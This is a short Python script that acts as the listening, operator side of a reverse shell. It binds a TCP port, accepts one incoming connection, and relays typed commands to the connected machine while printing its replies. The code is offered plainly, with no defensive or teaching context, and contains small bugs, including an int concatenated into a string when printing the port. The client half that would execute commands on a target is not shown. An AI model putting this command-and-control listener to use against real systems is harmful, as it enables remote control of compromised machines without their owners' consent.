import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port  = 1234
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error"+str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the socket..."+str(port))
        s.bind((host, port))
        s.listen(5)
    
    except socket.error as msg:
        print("Socket binding error"+str(msg)+"\n"+"Trying....")
        bind_socket()


def socket_accept():
    conn,address = s.accept()
    print("Socket connection established | IP "+address[0]+" | PORT "+address[1])
    send_command(conn)
    conn.close()

def send_command(conn):
    while True:
        cmd = input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


if __name__ == "__main__":
    create_socket()
    bind_socket()
    socket_accept()